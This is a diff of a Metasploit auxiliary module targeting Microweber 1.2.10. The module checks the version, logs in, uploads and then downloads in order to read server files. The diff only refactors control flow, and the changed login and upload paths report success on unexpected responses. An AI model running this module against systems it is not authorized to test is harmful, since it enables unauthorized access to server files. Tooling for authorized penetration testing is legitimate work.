@@ -64,10 +64,10 @@ class MetasploitModule < Msf::Auxiliary
   
     if version.include?('Version: 1.2.10')
       print_good 'Microweber ' + version
-      true
-    else
-      false
+      return true
     end
+
+    return false
   end
   
   def login
@@ -88,24 +88,25 @@ class MetasploitModule < Msf::Auxiliary
       if res.code != 200
         print_error 'Microweber cannot be reached.'
         return false
-      else
-        if !jsonRes['error'].nil?
-          print_error jsonRes['error']
-          return false
-        end
+      end
 
-        if !jsonRes['success'].nil? && jsonRes['success'] == 'You are logged in'
-          print_good jsonRes['success']
-          @cookie = res.get_cookies
-          return true
-        end
-
-        print_error 'An unknown error occurred.'
+      if !jsonRes['error'].nil?
+        print_error jsonRes['error']
         return false
       end
-    else
-      puts res.body
+
+      if !jsonRes['success'].nil? && jsonRes['success'] == 'You are logged in'
+        print_good jsonRes['success']
+        @cookie = res.get_cookies
+        return true
+      end
+
+      print_error 'An unknown error occurred.'
+      return false
     end
+
+    print_status res.body
+    return true  
   end
   
   def upload
@@ -128,13 +129,14 @@ class MetasploitModule < Msf::Auxiliary
       if jsonRes['success']
         print_good jsonRes['success']
         return true
-      else
-        print_error 'Either the file cannot be read or the file does not exist.'
-        return false
       end
-    else
-      puts res.body
+
+      print_error 'Either the file cannot be read or the file does not exist.'
+      return false
     end
+
+    print_status res.body
+    return true
   end
 
   def download
@@ -158,15 +160,20 @@ class MetasploitModule < Msf::Auxiliary
 
       if jsonRes['error']
         print_error jsonRes['error']
+        return
       end
-    else
-      puts res.body
     end
+
+    print_status res.body
   end
 
   def run
-    if check_version && login
-      if upload
+    valid_version = check_version
+    valid_login = login
+
+    if valid_version && valid_login
+      success = upload
+      if success
         download
       end
     end
